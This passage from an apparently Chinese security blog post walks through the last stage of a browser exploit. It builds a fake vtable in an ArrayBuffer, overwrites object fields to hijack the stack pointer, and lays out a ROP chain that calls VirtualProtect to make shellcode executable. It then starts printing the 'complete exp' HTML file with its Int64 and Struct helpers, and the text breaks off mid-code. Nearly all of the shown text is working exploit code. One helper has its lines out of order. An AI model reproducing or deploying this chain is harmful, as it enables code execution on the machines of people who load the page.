vtable和栈伪造，栈劫持和mprotect执行shellcode"></a>创建一块大的可读写空间，fake vtable和栈伪造，栈劫持和mprotect执行shellcode</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> scratch = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line"><span class="keyword">let</span> scratch_u8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(scratch);</span><br><span class="line"><span class="keyword">let</span> scratch_u64 = <span class="keyword">new</span> BigUint64Array(scratch);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">let</span> scratch_addr = readPtr(offset, scratch_buffer_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span><br><span class="line">scratch_u64.fill(gadget, <span class="number">0</span>, <span class="number">100</span>);<span class="comment">//把其首部当做fake_vtab，在virtual call执行的时候会执行这里面的语句，于是跳转到gadget执行，这个gadget用于栈劫持,此时rcx的值应为el_addr的地址。</span></span><br><span class="line"><span class="keyword">let</span> fake_vtab = scratch_addr;</span><br><span class="line">...</span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x10</span>).asDouble(), fake_stack); <span class="comment">// RSP</span></span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x50</span>).asDouble(), pop_rcx_ret + <span class="keyword">new</span> Int64(<span class="number">0x1</span>).asDouble()); <span class="comment">// RIP = ret</span></span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x58</span>).asDouble(), <span class="number">0</span>);</span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x60</span>).asDouble(), <span class="number">0</span>);</span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x68</span>).asDouble(), <span class="number">0</span>);</span><br><span class="line">writePtr(offset, el_addr, fake_vtab);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">00007</span>ff9<span class="string">`296f0705 488b5150        mov     rdx,qword ptr [rcx+50h]</span></span><br><span class="line"><span class="string">00007ff9`</span><span class="number">296</span>f0709 <span class="number">488</span>b6918        mov     rbp,qword ptr [rcx+<span class="number">18</span>h]</span><br><span class="line"><span class="number">00007</span>ff9<span class="string">`296f070d 488b6110        mov     rsp,qword ptr [rcx+10h] //改变rsp的值为fake_stack</span></span><br><span class="line"><span class="string">00007ff9`</span><span class="number">296</span>f0711 ffe2            jmp     rdx <span class="comment">//改变rip到一个ret指令</span></span><br></pre></td></tr></table></figure><p>栈劫持之后，开始执行我们的mprotect gadaget，使shellcode所在的页可执行，然后跳转到shellcode执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_stack = scratch_addr + <span class="keyword">new</span> Int64(<span class="number">0x10000</span>).asDouble();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> stack = [</span><br><span class="line">    pop_rcx_ret,</span><br><span class="line">    sc_addr,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="keyword">new</span> Int64(<span class="number">0x1000</span>).asDouble(),</span><br><span class="line">    pop_r8_ret,</span><br><span class="line">    <span class="keyword">new</span> Int64(<span class="number">0x40</span>).asDouble(),</span><br><span class="line">    pop_r9_ret,</span><br><span class="line">    scratch_addr,</span><br><span class="line">    virtaulprotect_addr, <span class="comment">// VirtualProtect</span></span><br><span class="line">    sc_addr,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; stack.length; ++i) &#123;</span><br><span class="line">    scratch_u64[<span class="number">0x10000</span>/<span class="number">8</span> + i] = stack[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">String</span>.prototype.padLeft =</span></span><br><span class="line"><span class="javascript"><span class="built_in">Number</span>.prototype.padLeft = <span class="function"><span class="keyword">function</span>(<span class="params">total, pad</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> (<span class="built_in">Array</span>(total).join(pad || <span class="number">0</span>) + <span class="keyword">this</span>).slice(-total);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return the hexadecimal representation of the given byte array.</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">hexlify</span><span class="params">(bytes)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> res = [];</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//console.log(bytes[i].toString(16));</span></span></span><br><span class="line"><span class="actionscript">        res.push((<span class="string">'0'</span> + bytes[i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>));</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> res.join(<span class="string">''</span>);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return the binary data represented by the given hexdecimal string.</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">unhexlify</span><span class="params">(hexstr)</span> </span>&#123;</span></span><br><span class="line">    if (hexstr.length % 2 == 1)</span><br><span class="line"><span class="javascript">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Invalid hex string"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(hexstr.length / <span class="number">2</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; hexstr.length; i += <span class="number">2</span>)</span></span><br><span class="line"><span class="javascript">        bytes[i/<span class="number">2</span>] = <span class="built_in">parseInt</span>(hexstr.substr(i, <span class="number">2</span>), <span class="number">16</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> bytes;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">hexdump</span><span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (<span class="keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="string">'undefined'</span>)</span></span><br><span class="line"><span class="javascript">        data = <span class="built_in">Array</span>.from(data);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> lines = [];</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> chunk = data.slice(i, i+<span class="number">16</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">16</span>) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> parts = chunk.map(hex);</span></span><br><span class="line">        if (parts.length &gt; 8)</span><br><span class="line"><span class="actionscript">            parts.splice(<span class="number">8</span>, <span class="number">0</span>, <span class="string">' '</span>);</span></span><br><span class="line"><span class="actionscript">        lines.push(parts.join(<span class="string">' '</span>));</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> lines.join(<span class="string">'\n'</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Simplified version of the similarly named python module.</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> Struct = (<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> buffer      = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> byteView    = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> uint32View  = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> float64View = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="actionscript">        pack: <span class="function"><span class="keyword">function</span><span class="params">(type, value)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span></span><br><span class="line">            view[0] = value;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, type.BYTES_PER_ELEMENT);</span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        unpack: <span class="function"><span class="keyword">function</span><span class="params">(type, bytes)</span> </span>&#123;</span></span><br><span class="line">            if (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line"><span class="javascript">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Invalid bytearray"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span></span><br><span class="line">            byteView.set(bytes);</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> view[<span class="number">0</span>];</span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">// Available types.</span></span></span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Int64</span><span class="params">(v)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// The underlying byte array.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">8</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">switch</span> (<span class="keyword">typeof</span> v) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">case</span> <span class="string">'number'</span>:</span></span><br><span class="line"><span class="javascript">            v = <span class="string">'0x'</span> + <span class="built_in">Math</span>.floor(v).toString(<span class="number">16</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">case</span> <span class="string">'string'</span>:</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (v.startsWith(<span class="string">'0x'</span>))</span></span><br><span class="line">                v = v.substr(2);</span><br><span class="line">            if (v.length % 2 == 1)</span><br><span class="line"><span class="actionscript">                v = <span class="string">'0'</span> + v;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> bigEndian = unhexlify(v, <span class="number">8</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//console.log(bigEndian.toString());</span></span></span><br><span class="line"><span class="javascript">            bytes.set(<span class="built_in">Array</span>.from(bigEndian).reverse());</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">case</span> <span class="string">'object'</span>:</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (v <span class="keyword">instanceof</span> Int64) &#123;</span></span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line"><span class="actionscript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">                if (v.length != 8)</span><br><span class="line"><span class="javascript">                    <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Array must have excactly 8 elements."</span>);</span></span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="actionscript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">case</span> <span class="string">'undefined'</span>:</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">default</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Int64 constructor requires an argument."</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Return a double whith the same underlying bit representation.</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.asDouble = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// Check for NaN</span></span></span><br><span class="line">        if (bytes[7] == 0xff &amp;&amp; (bytes[6] == 0xff || bytes[6] == 0xfe))</span><br><span class="line"><span class="javascript">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a double"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> Struct.unpack(Struct.float64, bytes);</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Return a javascript value with the same underlying bit representation.</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// due to double conversion constraints.</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.asJSValue = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line">        if ((bytes[7] == 0 &amp;&amp; bytes[6] == 0) || (bytes[7] == 0xff &amp;&amp; bytes[6] == 0xff))</span><br><span class="line"><span class="javascript">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a JSValue"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.assignSub(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> res = Struct.unpack(Struct.float64, bytes);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> res;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Return the underlying bytes of this number as array.</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.bytes = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="built_in">Array</span>.from(bytes);</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Return the byte at the given index.</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.byteAt = <span class="function"><span class="keyword">function</span><span class="params">(i)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> bytes[i];</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Return the value of this number as unsigned hex string.</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.toString = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//console.log("toString");</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="string">'0x'</span> + hexlify(<span class="built_in">Array</span>.from(bytes).reverse());</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Basic arithmetic.</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// These functions assign the result of the computation to their 'this' object.</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// Decorator for Int64 instance operations. Takes care</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// of converting arguments to Int64 instances if required.</span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">operation</span><span class="params">(f, nargs)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="built_in">arguments</span>.length != nargs)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Not enough arguments for function "</span> + f.name);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (!(<span class="built_in">arguments</span>[i] <span class="keyword">instanceof</span> Int64))</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">arguments</span>[i] = <span class="keyword">new</span> Int64(<span class="built_in">arguments</span>[i]);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> f.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// this = -n (two's complement)</span></span></span><br><span class="line"><span 